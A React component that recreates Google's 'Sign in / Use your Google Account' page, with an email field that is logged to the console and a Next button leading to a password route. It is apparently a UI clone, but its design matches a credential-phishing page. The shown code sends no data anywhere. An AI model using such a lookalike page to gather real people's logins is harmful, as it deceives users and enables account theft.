import "./Home.css";
import { useState } from "react";
import { useNavigate } from "react-router";

function Home() {
  const [user, setUser] = useState({});
  const navigate = useNavigate();

  function handleclickbtn() {
    console.log("Button Clicked");
    console.log(user);
    navigate("/pwd");
  }

  return (
    <div className="container">
      <div className="wrapper">
        <div className="img">
          <img
            src="https://cdn.telanganatoday.com/wp-content/uploads/2021/11/Google-Hyderabad-is-looking-to-hire-for-multiple-roles.jpg"
            alt=""
          />
        </div>
        <div className="textfields">
          <p className="title">Sign in</p>
          <p>Use your Google Account</p>
          <input
            type="text"
            placeholder="Email or Phone"
            required
            className="email"
            onInput={(e) => {
              user.email = e.target.value;
              setUser(user);
            }}
          />
          <p>
            <a href="Forget email?">Forgot Email ?</a>
          </p>
          <p>Not your computer? Use Guest mode to sign in privately</p>
        </div>
        <div className="bottom-section">
          <a href="#">Create Account</a>
          <button className="next-btn" onClick={handleclickbtn}>
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default Home;
